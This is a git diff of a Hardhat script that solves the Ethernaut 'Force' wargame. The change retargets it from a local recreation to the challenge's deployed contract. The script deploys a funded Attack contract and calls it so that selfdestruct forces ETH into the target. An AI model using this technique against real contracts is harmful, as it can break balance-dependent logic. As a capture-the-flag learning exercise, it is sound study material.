@@ -12,17 +12,18 @@ Sometimes the best way to attack a contract is with another contract.
 const hre = require("hardhat");
 
 async function main() {
-  // Recreating the attack on ganache
-  [macias, deployer] = await ethers.getSigners();
+  // Deployed on Ganache
+  [player] = await ethers.getSigners();
 
-  const Force = await hre.ethers.getContractFactory("Force");
-  this.force = await Force.connect(deployer).deploy();
-  await this.force.deployed();
+  // Get an instance of the contract deployed by Ethernaut
+  const ForceAddress = "0x3Ec87635f37C4AB34E1D11bf6132C2C36965001e"
+  this.force = await hre.ethers.getContractAt("Force",ForceAddress);
+
+  // Deploying the Attacker contract and funding it with 0.01 ETH
 
   const Attack = await hre.ethers.getContractFactory("Attack");
-  this.attack = await Attack.connect(macias).deploy(this.force.address, { value: hre.ethers.utils.parseEther("1") });  // Deploy the Attack contract and filling it up with 1 ETH
+  this.attack = await Attack.connect(player).deploy(this.force.address, { value: hre.ethers.utils.parseEther("0.01") });  // Deploy the Attack contract and filling it up with 0.01 ETH
   await this.attack.deployed();
-
 
   console.log("\n\n Performing attack ... \n\n");
 
@@ -35,10 +36,10 @@ async function main() {
   // Injecting ETH in the Force contract
   console.log("Injecting ETH in the Force contract ...");
   // The Attack contract will be selfdestructed and will send its ETH balance to the Force contract
-  const tx = await this.attack.connect(macias).attack();
+  const tx = await this.attack.connect(player).attack();
   
   // Await for the tx to be mined
-  console.log("Waiting the ETH balance of the Force contract is manipulated : )");
+  console.log("Waiting while the ETH balance of the Force contract is manipulated : )");
   let txResult = await tx.wait();
 
   console.log("transaction " , txResult);
